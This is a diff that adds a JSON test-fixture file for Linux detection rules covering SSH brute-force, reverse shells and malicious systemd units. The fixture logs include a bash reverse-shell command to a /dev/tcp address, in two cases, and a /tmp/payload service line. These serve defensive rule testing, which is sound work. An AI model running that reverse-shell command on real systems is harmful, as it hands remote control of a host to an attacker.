@@ -1,0 +1,146 @@
+[
+  {
+    "name": "user-auth-failure",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"USER_AUTH\",\"userauth\":{\"result\":\"fail\",\"addr\":\"198.51.100.10\"}}",
+    "match": true,
+    "actionResult": "",
+    "playground": false,
+    "preserve": {
+      "log.userauth.result": "fail"
+    }
+  },
+  {
+    "name": "user-auth-success",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"USER_AUTH\",\"userauth\":{\"result\":\"success\",\"addr\":\"198.51.100.10\"}}",
+    "match": false,
+    "actionResult": "",
+    "playground": false,
+    "preserve": {
+      "log.userauth.result": "success"
+    }
+  },
+  {
+    "name": "final-user-login-failure-is-not-user-auth",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"USER_LOGIN\",\"userlogin\":{\"result\":\"fail\",\"addr\":\"198.51.100.10\",\"op\":\"login\",\"terminal\":\"ssh\"}}",
+    "match": false,
+    "actionResult": "failure",
+    "playground": false,
+    "preserve": {
+      "log.userlogin.result": "fail",
+      "origin.ip": "198.51.100.10"
+    }
+  },
+  {
+    "name": "final-user-login-success-is-not-user-auth",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"USER_LOGIN\",\"userlogin\":{\"result\":\"success\",\"addr\":\"198.51.100.10\",\"op\":\"login\",\"terminal\":\"ssh\"}}",
+    "match": false,
+    "actionResult": "success",
+    "playground": false,
+    "preserve": {
+      "log.userlogin.result": "success",
+      "origin.ip": "198.51.100.10"
+    }
+  },
+  {
+    "name": "journal-failed-password",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"MESSAGE\":\"Failed password for invalid user reviewer from 198.51.100.10 port 50000 ssh2\"}",
+    "match": true,
+    "actionResult": "",
+    "playground": false,
+    "preserve": {}
+  },
+  {
+    "name": "journal-accepted-password",
+    "rule": "linux/bruteforce_attack.yml",
+    "raw": "{\"MESSAGE\":\"Accepted password for reviewer from 198.51.100.10 port 50000 ssh2\"}",
+    "match": false,
+    "actionResult": "",
+    "playground": false,
+    "preserve": {}
+  },
+  {
+    "name": "reverse-shell-success",
+    "rule": "linux/debian_family/reverse_shell_detection.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"SYSCALL\",\"syscall\":\"execve\",\"exe\":\"/usr/bin/bash\",\"proctitle\":\"bash -i >& /dev/tcp/198.51.100.20/4444 0>&1\",\"result\":\"success\",\"exit\":\"0\"}",
+    "match": true,
+    "actionResult": "success",
+    "playground": true,
+    "preserve": {
+      "log.result": "success",
+      "log.exit": "0",
+      "origin.process": "/usr/bin/bash"
+    }
+  },
+  {
+    "name": "reverse-shell-denied-attempt",
+    "rule": "linux/debian_family/reverse_shell_detection.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"SYSCALL\",\"syscall\":\"execve\",\"exe\":\"/usr/bin/bash\",\"proctitle\":\"bash -i >& /dev/tcp/198.51.100.20/4444 0>&1\",\"result\":\"fail\",\"exit\":\"EACCES\"}",
+    "match": true,
+    "actionResult": "denied",
+    "playground": true,
+    "preserve": {
+      "log.result": "fail",
+      "log.exit": "EACCES",
+      "origin.process": "/usr/bin/bash"
+    }
+  },
+  {
+    "name": "ordinary-shell-success",
+    "rule": "linux/debian_family/reverse_shell_detection.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"SYSCALL\",\"syscall\":\"execve\",\"exe\":\"/usr/bin/bash\",\"proctitle\":\"bash -c echo hello\",\"result\":\"success\",\"exit\":\"0\"}",
+    "match": false,
+    "actionResult": "success",
+    "playground": true,
+    "preserve": {}
+  },
+  {
+    "name": "ordinary-shell-failure",
+    "rule": "linux/debian_family/reverse_shell_detection.yml",
+    "raw": "{\"type\":\"auditd\",\"category\":\"SYSCALL\",\"syscall\":\"execve\",\"exe\":\"/usr/bin/bash\",\"proctitle\":\"bash -c missing-command\",\"result\":\"fail\",\"exit\":\"ENOENT\"}",
+    "match": false,
+    "actionResult": "failure",
+    "playground": true,
+    "preserve": {}
+  },
+  {
+    "name": "systemd-unit-attack-failure",
+    "rule": "linux/rhel_family/systemd_unit_file_attacks.yml",
+    "raw": "{\"MESSAGE\":\"Failed at step EXEC spawning /tmp/payload: Permission denied\",\"JOB_RESULT\":\"failed\"}",
+    "match": true,
+    "actionResult": "failure",
+    "playground": true,
+    "preserve": {}
+  },
+  {
+    "name": "systemd-unit-attack-pending",
+    "rule": "linux/rhel_family/systemd_unit_file_attacks.yml",
+    "raw": "{\"MESSAGE\":\"ExecStart=/tmp/payload\",\"JOB_RESULT\":\"pending\"}",
+    "match": true,
+    "actionResult": "",
+    "playground": false,
+    "preserve": {}
+  },
+  {
+    "name": "ordinary-service-success",
+    "rule": "linux/rhel_family/systemd_unit_file_attacks.yml",
+    "raw": "{\"MESSAGE\":\"Started example.service\",\"JOB_RESULT\":\"done\"}",
+    "match": false,
+    "actionResult": "success",
+    "playground": true,
+    "preserve": {}
+  },
+  {
+    "name": "ordinary-service-failure",
+    "rule": "linux/rhel_family/systemd_unit_file_attacks.yml",
+    "raw": "{\"MESSAGE\":\"example.service failed\",\"JOB_RESULT\":\"timeout\"}",
+    "match": false,
+    "actionResult": "failure",
+    "playground": true,
+    "preserve": {}
+  }
+]
